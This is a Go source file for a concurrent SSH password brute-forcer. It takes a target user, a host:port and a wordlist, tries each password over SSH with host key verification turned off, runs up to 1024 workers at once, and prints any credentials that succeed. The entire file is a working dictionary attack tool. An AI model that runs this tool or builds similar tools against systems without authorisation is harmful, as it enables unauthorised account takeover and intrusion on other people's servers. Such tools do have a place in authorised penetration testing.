package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"strings"
	"sync"

	"github.com/loveleshsharma/gohive"
	flag "github.com/spf13/pflag"
	"golang.org/x/crypto/ssh"
)

func main() {
	u := flag.StringP("user", "u", "", "The user you would like to attack")
	p := flag.StringP("wordlist", "w", "", "The wordlist to use for dictionary attack")
	h := flag.StringP("host", "h", "", "The host you want to attack. (host:port)")
	ps := flag.IntP("poolsize", "s", 1024, "How many concurrent workers can run together")

	flag.Parse()

	var wg sync.WaitGroup
	// var mut = &sync.Mutex{}

	if *p == "" {
		flag.Usage()
		log.Fatal("flag \"wordlist\" cannot be empty")
	}

	if *u == "" {
		flag.Usage()
		log.Fatal("flag \"usage\" cannot be empty")
	}

	if *ps == 0 {
		flag.Usage()
		log.Fatal("flag \"poolsize\" cannot be 0")
	}

	if *h == "" {
		flag.Usage()
		log.Fatal("flag \"host\" cannot be empty")
	} else if !strings.Contains(*h, ":") {
		flag.Usage()
		log.Fatal("flag \"host\" : usage: host:port")
	}

	content, err := ioutil.ReadFile(*p)
	if err != nil {
		log.Fatal(err)
	}

	hp := gohive.NewFixedSizePool(*ps)

	for _, v := range strings.Split(string(content), "\n") {
		wg.Add(1)

		hp.Submit(func() {
			defer wg.Done()
			// mut.Lock()

			conn, err := ssh.Dial("tcp", *h, &ssh.ClientConfig{
				User:            *u,
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Auth: []ssh.AuthMethod{
					ssh.Password(v),
				},
			})
			if err != nil {
				// fmt.Println(err)
			} else {
				fmt.Printf("found match for %s: %s:%s\n", *h, *u, v)
				conn.Close()
			}
			// mut.Unlock()
		})
	}

	wg.Wait()
}
